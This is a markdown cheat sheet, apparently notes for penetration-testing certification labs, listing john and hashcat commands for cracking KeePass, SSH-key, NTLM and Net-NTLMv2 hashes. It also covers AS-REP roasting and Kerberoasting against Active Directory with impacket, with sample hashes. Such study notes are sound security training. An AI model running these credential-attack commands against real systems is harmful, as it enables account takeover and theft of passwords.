# KEEPASS

First it we extract the password hash 
```bash
keepass2john Database.kdbx > keepass.hash
```
| Sometimes we might need to remove the user `Database:`

Then we crack it. We can either use *john*  
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt Keepasshash.txt
```

or *hashcat*. If we hashcat we must remember to strip off the initial "Database:" from the hash.
```bash
hashcat -m 13400 keepass.hash rockyou.txt -r rockyou-30000.rule --force
```

Then connect
```bash
keepasssxc Database.kdbx
```

-----------------------

# SSH KEY

First we extract the hash
```bash
ssh2john id_rsa > ssh.hash
```

Then we crack it. We can either use *john*  | Somtimes we might need to remove the username `id_rsa:`
```bash
john --wordlist=/usr/share/wordlists/passwords/rockyou.txt ssh.hash
```

or with *hashcat*
```bash
hashcat -m 22921 ssh.hash rockyou.txt --force
```

-----------------------

# NTLM

We can use *hashcat* with code 1000
```bash
hashcat -m 1000 nelly.hash rockyou.txt -r best64.rule --force
```

-----------------------

# Net-NTLMv2

We can use *hashcat* with code 5600
```bash
hashcat -m 5600 paul.hash rockyou.txt --force
```

-----------------------

# AS-REP roasting

Suppose we perform a AS-REP attack over a windows AD
```bash
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```

Then we get the following hash
#$krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578f03773a7908f337aa705bcb711f8bce2ca751a876a7564bdbd4a926c10da32b01ec750cf35a2c37abde02f28b7aa363ffa1d18c9dd0262e43ab6a5447db24f71256120f94c24b17b1df465beed362fcb14a539b4e9678029f3b3556413208e8d644fed540d453e1af6f20ab909fd3d9d35ea8b17958b56fd8658b147186042faaa686931b2b75716502775d1a18c11bd4c50df9c2a6b5a7ce2804df3c71c7dbbd7af7adf3092baa56ea865dd6e6fbc8311f940cd78609f1a6b0cd3fd150ba402f14fccd90757300452ce77e45757dc22*

to crack it we can use hashcat with code 18200
```bash
sudo hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force
```

-----------------------

# KERBEROASTING

Suppose we perform a kerberoasting attack over a windows AD
```bash
proxychains impacket-GetUserSPNs -request -dc-ip 10.10.132.146 oscp.exam/web_svc
```

Then we get the following hash
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...

to crack it we can use hashcat with code 13100
```bash
sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r best64.rule --force
```
